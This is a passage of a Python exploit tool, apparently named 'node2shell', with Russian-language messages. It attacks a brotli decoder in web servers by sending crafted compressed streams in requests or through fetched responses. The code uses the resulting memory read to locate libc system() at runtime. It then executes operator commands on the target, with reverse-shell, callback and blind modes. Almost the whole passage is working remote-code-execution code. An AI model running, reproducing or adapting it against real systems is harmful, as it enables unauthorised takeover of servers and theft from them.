    return "{ %s; } >%s 2>&1;node -e '%s'" % (user_command, output, script)


def open_operator(arguments, target, reporter):
    server = OperatorServer("0.0.0.0", arguments.lport)
    advertised = arguments.lhost or local_address(target)
    reporter.info("встроенный сервер " + reporter.paint.accent("http://%s:%d/" % (advertised, server.port)))
    return server, advertised


# ---------------------------------------------------------------------------
# Runtime libc resolver.  No GOT slot, libc offset or DT_DEBUG constants.
# The read primitive is the context_map_slice byte read built by
# build_ctx_phase(); one 27 MB phase stream per byte.
#
#   non-PIE (ET_EXEC, static data low): ELF@0x400000 -> PT_DYNAMIC ->
#     DT_DEBUG -> link_map -> GNU hash(libc, "system").
#   PIE (ET_DYN): the state view leaks context_lookup (state+0xa0, view bit
#     672), which points into libbrotlicommon's .rodata.  Its base is found
#     by scanning page starts down to the ELF header and verifying ET_DYN;
#     no table offset is assumed.  Then libbrotlicommon PT_DYNAMIC -> relocations
#     -> an external (eager GLOB_DAT) GOT pointer -> object base by page scan
#     -> libc PT_DYNAMIC -> GNU hash(libc, "system").  The main executable
#     base is not needed and is not resolved.
# ---------------------------------------------------------------------------

RT_PHASE = "/tmp/node2shell_ctx_phase.bin"
RT_READ_POS = 12
# A complete ctx-phase read body is ~16.9 KB; a 4-byte body is the preamble of
# a read that was cut short by the client-side stability window.
RT_MIN_BODY = 1024


class _CtxEmit:
    def __init__(self):
        self.out = bytearray()
        self.acc = 0
        self.n = 0

    def put(self, value, bits):
        self.acc |= (value & ((1 << bits) - 1)) << self.n
        self.n += bits
        while self.n >= 8:
            self.out.append(self.acc & 0xFF)
            self.acc >>= 8
            self.n -= 8

    def put_cmds(self, count, value):
        block = 0
        for i in range(8):
            block |= value << (13 * i)
        while count >= 8:
            self.acc |= block << self.n
            self.n += 104
            while self.n >= 8:
                self.out.append(self.acc & 0xFF)
                self.acc >>= 8
                self.n -= 8
            count -= 8
        for _ in range(count):
            self.put(value, 13)

    def finish(self):
        if self.n:
            self.out.append(self.acc & 0xFF)
            self.acc = 0
            self.n = 0
        return bytes(self.out)


def _ctx_varint(writer, value):
    if value == 0:
        writer.put(0, 1)
        return
    writer.put(1, 1)
    if value == 1:
        writer.put(0, 3)
        return
    nbits = value.bit_length() - 1
    writer.put(nbits, 3)
    writer.put(value - (1 << nbits), nbits)


def build_ctx_phase(path, c0=0):
    """Validated phase A: 256 literal trees (tree k emits k), 4 staged literals
    ending with context c0, then 2^24 zero-output commands (bl2 -> 0).  A 17-byte
    tail with J=95 then forges context_map_slice; the next command reads one
    target byte as htrees[T[context]]."""
    c0 &= 63
    w = BitWriter()
    w.put(1, 1); w.put(0, 3); w.put(2, 3)      # window bits
    w.put(0, 1)                                 # ISLAST
    w.put(2, 2)                                 # MNIBBLES
    w.put((1 << 24) - 1, 24)                    # metablock length
    w.put(0, 1)                                 # ISUNCOMPRESSED
    _ctx_varint(w, 3)                           # NBLTYPES[0] = 4
    simple_tree(w, [0], 6)
    simple_tree(w, [25], 26)
    w.put(0xFFFFFF, 24)
    _ctx_varint(w, 1)                           # NBLTYPES[1] = 2
    simple_tree(w, [0], 4)
    simple_tree(w, [25], 26)
    w.put(0xFFFFFF, 24)
    _ctx_varint(w, 0)                           # NBLTYPES[2] = 1
    w.put(3, 2); w.put(0, 4)                    # postfix 3, ndirect 0
    for _ in range(4):
        w.put(0, 2)                             # context modes LSB6
    _ctx_varint(w, 255)                         # 256 literal trees
    w.put(0, 1)                                 # no zero RLE
    complex_literal_tree(w, [0, 1, 2, 3, c0], forced_level=8)
    cmap = [0] * 256
    cmap[0], cmap[1], cmap[2], cmap[3] = 1, 2, 3, c0
    rev = [int(format(v, "08b")[::-1], 2) for v in range(256)]
    for value in cmap:
        w.put(rev[value], 8)
    w.put(0, 1)                                 # no MTF
    # 256 distance trees: the tailcopy continuation parses the decoder's own
    # struct as input, so a corrupted dist_context_map_slice can yield any
    # byte as dist_htree_index; 256 identical trees keep every index inside
    # the htree array (no OOB wild pointer -> no SIGSEGV on native TLS).
    _ctx_varint(w, 255)                         # 256 distance trees
    w.put(0, 1)                                 # no zero RLE
    complex_literal_tree(w, [0], forced_level=8)
    for _ in range(4):
        w.put(0, 8)                             # 4 distance contexts -> tree 0
    w.put(0, 1)                                 # no MTF
    for k in range(256):
        simple_tree(w, [k], 256)
    simple_tree(w, [130, 162], 704)
    simple_tree(w, [130, 162], 704)
    for _ in range(256):
        simple_tree(w, [16, 176], 400)

    body = _CtxEmit()
    body.acc = w.value()
    body.n = w.total
    # staging command 162: insert 4; distance 176 + 11 extra bits 386 -> len 0
    body.put(1, 1)
    body.put(1, 1)
    body.put(386, 11)
    # marathon: symbol 130 (bit 0), distance 176 (bit 1), 11 extra bits
    cmd = (386 << 2) | (1 << 1)
    body.put_cmds((1 << 24) - 1, cmd)
    data = body.finish()
    with open(path, "wb") as handle:
        handle.write(data)
    return data


class RuntimeReader:
    def __init__(self, target, workers=4, timeout=90, insecure=False,
                 vector="request", server=None, feed_host=None):
        self.target = target
        self.workers = max(1, int(workers))
        self.timeout = timeout
        self.insecure = insecure
        self.vector = vector
        self.server = server
        self.feed_host = feed_host
        self.cache = {}
        self.requests = 0
        if not os.path.exists(RT_PHASE) or os.path.getsize(RT_PHASE) != 27264422:
            build_ctx_phase(RT_PHASE, 0)
        with open(RT_PHASE, "rb") as handle:
            self.phase = handle.read()

    def _read_one(self, addr):
        errors = []
        short = None
        for _ in range(4):
            try:
                return self._read_attempt(addr)
            except (OSError, ssl.SSLError) as error:
                errors.append(error)
                time.sleep(0.3)
            except RuntimeError as error:
                # A 4-byte preamble that never grows into the ~16.9 KB body is
                # a timing race, not a rejected target: retry on a fresh
                # connection (same as transport errors).
                short = error
        if errors:
            raise errors[-1]
        raise short

    def _read_attempt(self, addr):
        if self.vector == "response":
            channel = RelayChannel(self.target, self.server, self.feed_host,
                                   self.timeout, self.insecure)
        else:
            channel = RequestChannel(self.target, self.timeout, self.insecure)
        reader = None
        try:
            channel.send(self.phase)
            tail = bytearray(17)
            tail[0] = 0x04
            tail[8] = 95
            tail[9:17] = struct.pack("<Q", addr)
            channel.send(bytes(tail))
            channel.send(bytes(1500))
            reader = channel.reader
            last = -1
            stable = 0
            deadline = time.time() + self.timeout
            while time.time() < deadline:
                time.sleep(0.25)
                current = reader.length()
                if current == last:
                    if current >= RT_MIN_BODY:
                        stable += 1
                        if stable >= 4:
                            break
                    elif current > 0:
                        # 0..RT_MIN_BODY bytes: on a slow/emulated target
                        # (qemu arm64, 8 workers) the 4-byte preamble is
                        # followed by the body seconds later.  Wait 20 s of
                        # no growth before calling it a short read; never
                        # accept it as the result.
                        stable += 1
                        if stable >= 80 or reader.closed:
                            break
                    else:
                        stable = 0
                else:
                    stable = 0
                    last = current
                if reader.closed:
                    break
            data = reader.snapshot()
        finally:
            channel.close()
        self.requests += 1
        if len(data) <= RT_READ_POS:
            if reader is not None and reader.error is not None:
                raise reader.error
            raise RuntimeError("нет байта на 0x%x (получено %d, ожидается -17 на патче)"
                               % (addr, len(data)))
        return data[RT_READ_POS]

    def read_ranges(self, ranges):
        import concurrent.futures as cf
        need = set()
        for addr, count in ranges:
            for i in range(count):
                value = addr + i
                if value not in self.cache:
                    need.add(value)
        missing = sorted(need)
        if missing:
            with cf.ThreadPoolExecutor(max_workers=self.workers) as pool:
                for addr, byte in zip(missing, pool.map(self._read_one, missing)):
                    self.cache[addr] = byte
        return [bytes(self.cache[addr + i] for i in range(count)) for addr, count in ranges]

    def bytes(self, addr, count):
        return self.read_ranges([(addr, count)])[0]

    def u8(self, addr):
        return self.bytes(addr, 1)[0]

    def u32(self, addr):
        return struct.unpack("<I", self.bytes(addr, 4))[0]

    def u64(self, addr):
        return struct.unpack("<Q", self.bytes(addr, 8))[0]

    def cstr(self, addr, limit=64):
        data = self.bytes(addr, limit)
        end = data.find(b"\x00")
        if end >= 0:
            data = data[:end]
        return data.decode("latin1")


RT_DT_NULL = 0
RT_DT_PLTRELSZ = 2
RT_DT_PLTGOT = 3
RT_DT_STRTAB = 5
RT_DT_SYMTAB = 6
RT_DT_RELA = 7
RT_DT_RELASZ = 8
RT_DT_RELAENT = 9
RT_DT_STRSZ = 10
RT_DT_SYMENT = 11
RT_DT_DEBUG = 21
RT_DT_JMPREL = 23
RT_DT_GNU_HASH = 0x6FFFFEF5

RT_R_GLOB_DAT = 6      # x86_64 R_X86_64_GLOB_DAT (eager)
RT_R_JUMP_SLOT = 7     # x86_64 R_X86_64_JUMP_SLOT (may stay lazy)

# context_lookup lives at state+0xa0 (buffer is state+0x48): view bit index
# (0xa0-72)*8-32.  This is a brotli 1.2.0 struct-layout offset, not an address;
# the library base is located by scanning down to its ELF header.
RT_VIEW_CONTEXT_LOOKUP = (0xA0 - 72) * 8 - 32
RT_NONPIE_BASE = 0x400000
RT_NONPIE_STATIC_LIMIT = 0x100000000
RT_MAX_PAGE_SCAN = 512


def rt_parse_elf(reader, base):
    header = reader.bytes(base, 64)
    if header[:4] != b"\x7fELF":
        raise RuntimeError("не ELF по 0x%x: %s" % (base, header[:4].hex()))
    e_type = struct.unpack_from("<H", header, 0x10)[0]
    e_phoff = struct.unpack_from("<Q", header, 0x20)[0]
    e_phentsize = struct.unpack_from("<H", header, 0x36)[0]
    e_phnum = struct.unpack_from("<H", header, 0x38)[0]
    types = reader.read_ranges([(base + e_phoff + i * e_phentsize, 1)
                                for i in range(e_phnum)])
    dynamic = None
    for index, kind in enumerate(types):
        if kind[0] == 2:  # PT_DYNAMIC
            entry = base + e_phoff + index * e_phentsize
            vaddr, memsz = struct.unpack(
                "<QQ", b"".join(reader.read_ranges([(entry + 16, 8), (entry + 40, 8)])))
            dynamic = (vaddr, memsz)
            break
    if dynamic is None:
        raise RuntimeError("нет PT_DYNAMIC по 0x%x" % base)
    return (e_type, e_phoff, e_phentsize, e_phnum), dynamic


def rt_parse_dynamic(reader, addr, size, wanted):
    count = size // 16
    firsts = reader.read_ranges([(addr + 16 * i, 1) for i in range(count)])
    candidates = [(i, firsts[i][0]) for i in range(count)]
    high = [(i, low) for i, low in candidates if low == 0 or low >= 0xF0]
    full = {}
    if high:
        raws = reader.read_ranges([(addr + 16 * i, 8) for i, low in high])
        for (i, low), raw in zip(high, raws):
            full[i] = struct.unpack("<Q", raw)[0]
    final = []
    for i, low in candidates:
        tag = full.get(i, low)
        if tag == RT_DT_NULL:
            break
        if tag in wanted:
            final.append((i, tag))
    values = reader.read_ranges([(addr + 16 * i + 8, 8) for i, tag in final])
    tags = {}
    for (i, tag), raw in zip(final, values):
        tags[tag] = struct.unpack("<Q", raw)[0]
    return tags


def rt_gnu_hash(name):
    value = 5381
    for char in name.encode():
        value = ((value << 5) + value + char) & 0xFFFFFFFF
    return value


def rt_gnu_lookup(reader, bias, tags, name):
    gnu_hash = tags.get(RT_DT_GNU_HASH)
    strtab = tags.get(RT_DT_STRTAB)
    symtab = tags.get(RT_DT_SYMTAB)
    syment = tags.get(RT_DT_SYMENT, 24)
    if not gnu_hash or not strtab or not symtab:
        raise RuntimeError("нет GNU_HASH/STRTAB/SYMTAB")

    def rel(value):
        return bias + value if bias and value < bias else value

    hashed = rt_gnu_hash(name)
    nbuckets, symoffset, bloom_size, bloom_shift = struct.unpack(
        "<IIII", reader.bytes(rel(gnu_hash), 16))
    buckets = rel(gnu_hash) + 16 + bloom_size * 8
    chains = buckets + nbuckets * 4
    bucket = reader.u32(buckets + 4 * (hashed % nbuckets))
    if bucket < symoffset:
        raise RuntimeError("%s: пустой bucket" % name)
    index = bucket
    while True:
        chain = reader.u32(chains + 4 * (index - symoffset))
        if (chain | 1) == (hashed | 1):
            break
        if chain & 1:
            raise RuntimeError("%s: нет в цепочке (idx %d)" % (name, index))
        index += 1
    raw = reader.bytes(rel(symtab) + index * syment, 24)
    st_name = struct.unpack_from("<I", raw, 0)[0]
    st_value = struct.unpack_from("<Q", raw, 8)[0]
    found = reader.cstr(rel(strtab) + st_name, len(name) + 4)
    if found != name:
        raise RuntimeError("%s: имя не совпало: %r" % (name, found))
    return index, st_value


def rt_walk_link_map(reader, dt_debug, want="libc.so.6", max_maps=16):
    current = reader.u64(dt_debug + 8)
    chain = [current]
    for _ in range(9):
        nxt = reader.u64(current + 24)
        if not nxt:
            break
        chain.append(nxt)
        current = nxt
    for index, mapping in enumerate(chain):
        raw = reader.bytes(mapping, 24)
        l_addr, l_name, l_ld = struct.unpack_from("<QQQ", raw, 0)
        name = reader.cstr(l_name, 48) if l_name else ""
        if want in name:
            return l_addr, l_ld, index, name
        if index >= 9:
            nxt = reader.u64(mapping + 24)
            if not nxt:
                break
            chain.append(nxt)
    raise RuntimeError("%s не найден в link_map" % want)


def rt_view_leak(reader):
    """Leak the decoder state view (A/B bits) through the same channel."""
    if reader.vector == "response":
        channel = RelayChannel(reader.target, reader.server, reader.feed_host,
                               reader.timeout, reader.insecure)
    else:
        channel = RequestChannel(reader.target, reader.timeout, reader.insecure)
    try:
        state_stream, state_tail = build_state_stream()
        channel.send(state_stream)
        time.sleep(0.3)
        channel.send(state_tail)
        time.sleep(0.3)
        channel.send(b"\x01")
        wait_length(channel.reader, 7776, reader.timeout, stable=0.6)
        return channel.reader.snapshot()
    finally:
        channel.close()


def rt_scan_elf_base(reader, addr, limit=RT_MAX_PAGE_SCAN, want_type=None):
    """Walk page starts down from addr until a matching ELF header is found.

    Returns (base, pages_walked).  Pages above the object base are mapped, so
    the walk stops at the first verified ELF header and never reads below it.
    """
    page = addr & ~0xFFF
    for step in range(limit):
        if reader.u8(page) == 0x7F:
            magic = reader.bytes(page, 4)
            if magic == b"\x7fELF":
                e_type = struct.unpack("<H", reader.bytes(page + 0x10, 2))[0]
                if want_type is None or e_type == want_type:
                    return page, step
        page -= 0x1000
    raise RuntimeError("ELF-база (e_type=%s) для 0x%x не найдена за %d страниц"
                       % (want_type, addr, limit))


def rt_pick_base(reader, lookup):
    """Choose the ELF to parse: non-PIE main executable or libbrotlicommon."""
    if not lookup or lookup < 0x1000:
        raise RuntimeError("context_lookup не получен из среза состояния")
    if lookup < RT_NONPIE_STATIC_LIMIT:
        # ET_EXEC static data lives low; the main executable is at 0x400000.
        magic = reader.bytes(RT_NONPIE_BASE, 4)
        if magic != b"\x7fELF":
            raise RuntimeError("не ELF по 0x%x: %s"
                               % (RT_NONPIE_BASE, magic.hex()))
        return RT_NONPIE_BASE, "main-nonpie", 0
    # PIE: context_lookup points into libbrotlicommon; find its ELF base.
    base, steps = rt_scan_elf_base(reader, lookup, want_type=3)
    return base, "brotli-pie", steps


def rt_elf_load_end(reader, base, header):
    _e_type, e_phoff, e_phentsize, e_phnum = header
    ends = []
    for index in range(e_phnum):
        entry = base + e_phoff + index * e_phentsize
        if reader.u8(entry) != 1:  # PT_LOAD; type byte already cached
            continue
        vaddr = struct.unpack("<Q", reader.bytes(entry + 16, 8))[0]
        memsz = struct.unpack("<Q", reader.bytes(entry + 40, 8))[0]
        ends.append(vaddr + memsz)
    return base + max(ends) if ends else base


def rt_reloc_candidates(reader, base, tags, span):
    """External pointers from GOT relocations of an ET_DYN object.

    Only GLOB_DAT/JUMP_SLOT are considered; pointers that land inside the
    object itself (PLT stubs, default alloc/free hooks) are skipped.  The
    first external eager pointer on glibc is __cxa_finalize, i.e. libc.
    """

    def rel(value):
        return base + value if value < base else value

    candidates = []
    for size_tag, addr_tag in ((RT_DT_RELASZ, RT_DT_RELA),
                               (RT_DT_PLTRELSZ, RT_DT_JMPREL)):
        size = tags.get(size_tag)
        addr = tags.get(addr_tag)
        if not size or not addr:
            continue
        entry_size = tags.get(RT_DT_RELAENT, 24)
        count = min(size // entry_size, 256)
        table = rel(addr)
        for index in range(count):
            raw = reader.bytes(table + index * entry_size, 16)
            r_offset, r_info = struct.unpack("<QQ", raw)
            kind = r_info & 0xFFFFFFFF
            if kind not in (RT_R_GLOB_DAT, RT_R_JUMP_SLOT):
                continue
            slot = rel(r_offset)
            try:
                value = reader.u64(slot)
            except RuntimeError:
                continue
            if not value or base <= value < span:
                continue
            if value not in [item[0] for item in candidates]:
                candidates.append((value, slot))
    return candidates


def rt_object_base(reader, addr, limit=RT_MAX_PAGE_SCAN):
    """Walk page starts down from addr until an ELF header is found."""
    base, _steps = rt_scan_elf_base(reader, addr, limit)
    return base


def rt_system_via_got(reader, base, header, tags):
    """ET_DYN route: libbrotlicommon GOT -> libc base -> GNU hash(system)."""
    span = rt_elf_load_end(reader, base, header)
    candidates = rt_reloc_candidates(reader, base, tags, span)
    if not candidates:
        raise RuntimeError("PIE: нет внешних GOT-указателей в relocations")
    tried = set()
    last = None
    for value, slot in candidates:
        try:
            object_base = rt_object_base(reader, value)
        except RuntimeError as error:
            last = error
            continue
        if object_base in tried:
            continue
        tried.add(object_base)
        try:
            object_header, (dyn_off, dyn_size) = rt_parse_elf(reader, object_base)
            if object_header[0] != 3:
                continue
            object_tags = rt_parse_dynamic(
                reader, object_base + dyn_off, dyn_size,
                {RT_DT_STRTAB, RT_DT_SYMTAB, RT_DT_STRSZ,
                 RT_DT_SYMENT, RT_DT_GNU_HASH})
            if not object_tags.get(RT_DT_GNU_HASH):
                continue
            sym_index, st_value = rt_gnu_lookup(
                reader, object_base, object_tags, "system")
        except RuntimeError as error:
            last = error
            continue
        if not st_value:
            continue
        object_span = rt_elf_load_end(reader, object_base, object_header)
        system = object_base + st_value
        if not object_base <= system < object_span:
            continue
        return {"libc_base": object_base, "libc_ld": 0,
                "libc_name": "libc (GOT)", "libc_index": 0,
                "system": system, "system_sym": sym_index,
                "st_value": st_value, "got_slot": slot,
                "got_value": value}
    raise RuntimeError("PIE: libc/system не найдены через GOT (%s)"
                       % (last or "нет кандидатов"))


def rt_resolve(target, workers=4, timeout=90, insecure=False,
               vector="request", server=None, feed_host=None):
    reader = RuntimeReader(target, workers, timeout, insecure,
                           vector, server, feed_host)
    view = rt_view_leak(reader)
    if len(view) < 7776:
        raise RuntimeError(
            "срез состояния не получен: %d байт (поток отклонён: патч "
            "brotli 1.2.1/-17 или несовместимый tail-copy codegen)" % len(view))
    lookup = view_bits(view, RT_VIEW_CONTEXT_LOOKUP, 64)
    base, elf_kind, scan_pages = rt_pick_base(reader, lookup)
    (e_type, e_phoff, e_phentsize, e_phnum), (dyn_off, dyn_size) = \
        rt_parse_elf(reader, base)
    if elf_kind == "main-nonpie" and e_type != 2:
        raise RuntimeError("0x%x: e_type=%d, ожидался ET_EXEC" % (base, e_type))
    if elf_kind == "brotli-pie" and e_type != 3:
        raise RuntimeError("0x%x: e_type=%d, ожидался ET_DYN" % (base, e_type))
    if e_type == 3:
        wanted = {RT_DT_STRTAB, RT_DT_SYMTAB, RT_DT_STRSZ, RT_DT_SYMENT,
                  RT_DT_GNU_HASH, RT_DT_RELA, RT_DT_RELASZ, RT_DT_RELAENT,
                  RT_DT_JMPREL, RT_DT_PLTRELSZ, RT_DT_PLTGOT}
        tags = rt_parse_dynamic(reader, base + dyn_off, dyn_size, wanted)
        resolution = rt_system_via_got(
            reader, base, (e_type, e_phoff, e_phentsize, e_phnum), tags)
    else:
        dynamic_addr = dyn_off
        wanted = {RT_DT_STRTAB, RT_DT_SYMTAB, RT_DT_STRSZ, RT_DT_SYMENT,
                  RT_DT_DEBUG, RT_DT_PLTRELSZ, RT_DT_JMPREL, RT_DT_GNU_HASH}
        tags = rt_parse_dynamic(reader, dynamic_addr, dyn_size, wanted)
        dt_debug = tags.get(RT_DT_DEBUG)
        if not dt_debug:
            raise RuntimeError("нет DT_DEBUG")
        libc_base, libc_ld, libc_index, libc_name = \
            rt_walk_link_map(reader, dt_debug)
        (_le_type, _le_phoff, _le_phentsize, _le_phnum), \
            (libc_dyn_off, libc_dyn_size) = rt_parse_elf(reader, libc_base)
        libc_dynamic = libc_ld or (libc_base + libc_dyn_off)
        libc_tags = rt_parse_dynamic(reader, libc_dynamic, libc_dyn_size,
                                     {RT_DT_STRTAB, RT_DT_SYMTAB, RT_DT_STRSZ,
                                      RT_DT_SYMENT, RT_DT_GNU_HASH})
        sym_index, st_value = rt_gnu_lookup(reader, libc_base, libc_tags, "system")
        resolution = {"libc_base": libc_base, "libc_ld": libc_ld,
                      "libc_name": libc_name, "libc_index": libc_index,
                      "system": libc_base + st_value, "system_sym": sym_index,
                      "st_value": st_value}
    resolution["elf_base"] = base
    resolution["elf_kind"] = elf_kind
    resolution["elf_scan_pages"] = scan_pages
    resolution["context_lookup"] = lookup
    resolution["requests"] = reader.requests
    return resolution


def perform(arguments, paint, stream):
    target = Target(arguments.url)
    reporter = Reporter(paint, arguments.quiet, stream)
    timeout = arguments.timeout
    report = {"target": target.root, "success": False, "blind": False, "reverse": False}
    reverse = arguments.reverse
    callback = arguments.callback
    leak_only = arguments.leak_mode
    if sum(1 for flag in (reverse, callback, leak_only) if flag) > 1:
        reporter.bad("режимы -r, -C и --leak взаимоисключающие")
        return 2, report
    blind = not (callback or leak_only)
    report["reverse"] = reverse
    report["blind"] = blind
    report["callback"] = callback
    report["leak"] = leak_only
    if reverse and not (arguments.lhost and arguments.lport):
        reporter.bad("обратной оболочке нужны -L и -P")
        return 2, report
    if leak_only:
        mode_name = "leak"
    elif reverse:
        mode_name = "reverse"
    elif callback:
        mode_name = "callback"
    else:
        mode_name = "blind"
    report["mode"] = mode_name
    report["got"] = arguments.got
    reporter.info("режим " + paint.accent(mode_name))
    reporter.step("цель " + paint.accent(target.root))
    if target.scheme == "https":
        reporter.info("TLS " + paint.accent("включён")
                      + (" без проверки сертификата (-k)" if arguments.insecure
                         else ", проверка сертификата"))

    if arguments.runtime and arguments.got is not None:
        reporter.bad("--runtime и --got взаимоисключающие")
        return 2, report
    runtime = arguments.runtime or arguments.got is None
    probe_stream, _probe_tail = build_leak_stream(0)
    reporter.detail("пробный поток: %d байт; режим %s"
                    % (len(probe_stream), "runtime" if runtime else "legacy got=0x%x" % arguments.got))

    mode = arguments.mode
    vector = None
    server = None
    advertised = None
    if mode in ("auto", "request"):
        if mode == "request" or probe_request(target, probe_stream[:8192], timeout, arguments.insecure):
            vector = "request"
            reporter.info("вектор " + paint.accent("request") + ": POST с Content-Encoding: br")
    if vector is None and mode in ("auto", "response"):
        server, advertised = open_operator(arguments, target, reporter)
        if probe_relay(target, server, advertised, probe_stream[:8192], timeout, arguments.insecure):
            vector = "response"
            reporter.info("вектор " + paint.accent("response") + ": цель забирает поток через fetch()")
        else:
            reporter.bad("цель не декодирует Brotli ни в запросе, ни в ответе")
            return 1, report
    report["vector"] = vector

    if callback and server is None:
        server, advertised = open_operator(arguments, target, reporter)

    if runtime:
        if arguments.system:
            pointer = 0
            libc_base = 0
            system_address = arguments.system
            report["system"] = system_address
            report["runtime_requests"] = 0
            report["runtime_seconds"] = 0.0
            reporter.ok("system из --system: 0x%x (резолвер пропущен)" % system_address)
        else:
            reporter.step("фаза 1: runtime-резолвер libc (ELF/dynamic -> libc -> GNU hash)")
            started = time.time()
            try:
                resolution = rt_resolve(target, arguments.resolve_workers,
                                        timeout, arguments.insecure,
                                        report["vector"], server, advertised)
            except ssl.SSLCertVerificationError:
                raise
            except RuntimeError as error:
                reporter.bad("runtime-резолвер: %s" % error)
                reporter.bad("поток отклонён: патч brotli (26.12.1, -17) или "
                             "несовместимый tail-copy codegen; выполнения нет")
                report["verdict"] = "patched"
                return 1, report
            except (OSError, ConnectionError, ValueError) as error:
                reporter.bad("runtime-резолвер: сбой канала: %s" % error)
                return 5, report
            elapsed = time.time() - started
            pointer = 0
            libc_base = resolution["libc_base"]
            system_address = resolution["system"]
            report["libc_base"] = libc_base
            report["libc_ld"] = resolution.get("libc_ld")
            report["libc_name"] = resolution.get("libc_name")
            report["system"] = system_address
            report["system_sym"] = resolution.get("system_sym")
            report["st_value"] = resolution.get("st_value")
            report["runtime_requests"] = resolution["requests"]
            report["runtime_seconds"] = round(elapsed, 1)
            report["elf_base"] = resolution.get("elf_base")
            report["elf_kind"] = resolution.get("elf_kind")
            report["elf_scan_pages"] = resolution.get("elf_scan_pages", 0)
            report["context_lookup"] = resolution.get("context_lookup")
            report["got_slot"] = resolution.get("got_slot")
            report["got_value"] = resolution.get("got_value")
            scan_suffix = (", скан %d стр." % report["elf_scan_pages"]
                           if report["elf_scan_pages"] else "")
            reporter.ok("runtime: ELF 0x%x (%s%s), база libc 0x%x, system 0x%x (sym %d), "
                        "чтений %d, %.0f с"
                        % (resolution.get("elf_base", 0),
                           resolution.get("elf_kind", "?"), scan_suffix,
                           libc_base, system_address,
                           resolution.get("system_sym", 0),
                           resolution["requests"], elapsed))
    else:
        leak_stream, leak_tail = build_leak_stream(arguments.got)
        reporter.detail("поток лика libc: %d байт, хвост %d байт"
                        % (len(leak_stream), len(leak_tail)))
        reporter.step("фаза 1: лик libc через встроенный просмотр выхода")
        if report["vector"] == "request":
            channel = RequestChannel(target, timeout, arguments.insecure)
        else:
            channel = RelayChannel(target, server, advertised, timeout, arguments.insecure)
        channel.send(leak_stream)
        time.sleep(0.3)
        channel.send(leak_tail)
        time.sleep(0.3)
        channel.send(b"\x01")
        wait_length(channel.reader, LEAK_POSITION, timeout, stable=1.0)
        leak_dump = channel.reader.snapshot()
        if arguments.save:
            with open(arguments.save + "-libc.bin", "wb") as handle:
                handle.write(leak_dump)
        report["leak_bytes"] = len(leak_dump)
        if len(leak_dump) >= LEAK_POSITION + 8:
            pointer = struct.unpack("<Q", leak_dump[LEAK_POSITION:LEAK_POSITION + 8])[0]
        else:
            pointer = 0
        if not pointer or pointer >> 40 != 0x7F:
            reporter.bad("лик не получен: %d байт, указателя libc нет" % len(leak_dump))
            reporter.bad("поток отклонён: ERR__ERROR_FORMAT_BLOCK_SWITCH (errno -17), выполнения нет")
            report["verdict"] = "patched"
            return 1, report
        try:
            if arguments.lib:
                execvp_offset, system_offset = resolve_libc(arguments.lib)
            else:
                execvp_offset, system_offset = IMAGE_EXECVP_OFFSET, IMAGE_SYSTEM_OFFSET
            libc_base, system_address = derive_libc(pointer, execvp_offset, system_offset)
        except (OSError, ValueError) as error:
            reporter.bad("не удалось вывести system(): %s" % error)
            return 1, report
        report["leak_pointer"] = pointer
        report["libc_base"] = libc_base
        report["system"] = system_address
        reporter.ok("execvp@GOT 0x%x, база libc 0x%x, system 0x%x" % (pointer, libc_base, system_address))

    reporter.step("фаза 2: лик состояния")
    state_stream, state_tail = build_state_stream()
    reporter.detail("поток состояния: %d байт, хвост %d байт" % (len(state_stream), len(state_tail)))
    if report["vector"] == "request":
        channel = RequestChannel(target, timeout, arguments.insecure)
    else:
        channel = RelayChannel(target, server, advertised, timeout, arguments.insecure)
    channel.send(state_stream)
    time.sleep(0.3)
    channel.send(state_tail)
    time.sleep(0.3)
    channel.send(b"\x01")
    wait_length(channel.reader, 7776, timeout, stable=0.6)
    view = channel.reader.snapshot()
    if arguments.save:
        with open(arguments.save + "-view.bin", "wb") as handle:
            handle.write(view)
    report["view_bytes"] = len(view)
    if len(view) < 7776:
        reporter.bad("срез состояния не получен: %d байт" % len(view))
        return 3, report
    ringbuffer = view_bits(view, VIEW_RINGBUFFER, 64)
    lists = view_bits(view, VIEW_ARENA_LISTS, 64)
    state = (lists - ARENA_LISTS_DELTA) & MASK64
    if not state or not ringbuffer or (state + ARENA_LISTS_DELTA) & MASK64 != lists:
        reporter.bad("срез состояния не содержит self-pointer")
        return 3, report
    report["state"] = state
    report["ringbuffer"] = ringbuffer
    reporter.ok("срез %d байт, rb 0x%x, state 0x%x" % (len(view), ringbuffer, state))

    if leak_only:
        reporter.verdict(True, paint.ok("лик готов: libc 0x%x, system 0x%x, state 0x%x"
                                        % (libc_base, system_address, state)))
        report["verdict"] = "leak"
        return 0, report

    marker = "/tmp/n2s_%s" % os.urandom(4).hex()
    token = os.urandom(6).hex()
    if reverse:
        command = reverse_shell_command(arguments.lhost, arguments.lport)
    elif callback:
        command = callback_command(arguments.command or "id", advertised, server.port, token, marker)
    else:
        command = arguments.command or "id"
    command = command + "    "
    length = len(command.encode()) + 1
    report["command"] = command
    reporter.detail("команда: %s" % command)
    if length > STATE_BODY_LIMIT:
        reporter.bad("команда длиной %d не помещается в состояние (лимит %d)" % (length, STATE_BODY_LIMIT))
        return 2, report
    if length >= STATE_LONG_LIMIT:
        reporter.bad("команда длиной %d: длинная insert-ветка (>= %d байт) не поддерживается "
                     "— цель падает SIGSEGV; сократите команду или пишите файл коротким "
                     "бутстрапом" % (length, STATE_LONG_LIMIT))
        return 2, report

    left = STAGED_LITERALS - len(view)
    if left <= 0 or left % 8:
        reporter.bad("адаптивный паддинг не сходится: остаток %d бит" % left)
        return 3, report
    padding = left // 8
    garbage, offset, structure = geometry(length)
    reporter.detail("паддинг %d байт, garbage %d, offset %d, структура %d бит"
                    % (padding, garbage, offset, structure))
    body, tail, client, detail = build_mb2(state, system_address, command, garbage, offset)
    report["padding"] = padding
    report["header_bit"] = detail["header_bit"]
    channel.send(bytes(padding) + body)
    time.sleep(0.3)
    channel.send(tail)
    time.sleep(0.3)
    channel.send(client)
    deadline = time.time() + (min(timeout, 10.0) if callback else timeout)
    echo = b""
    while time.time() < deadline:
        time.sleep(0.1)
        current = channel.reader.snapshot()[len(view):]
        if any(byte != 0x41 and byte != 0x42 for byte in current):
            echo = current
            break
        if len(current) > 40000:
            echo = current
            break
    report["echo_bytes"] = len(echo)
    if arguments.save:
        with open(arguments.save + "-echo.bin", "wb") as handle:
            handle.write(echo)
    reporter.detail("эхо %d байт" % len(echo))

    if not callback:
        time.sleep(2.0)
        if reverse:
            reporter.ok("обратная оболочка отправлена, слушайте: nc -lvnp %d" % arguments.lport)
            report["verdict"] = "reverse"
        else:
            reporter.ok("команда отправлена, слепой режим: вывод не собирается")
            report["verdict"] = "blind"
        return 0, report

    reporter.step("фаза 3: вывод команды через встроенный сервер")
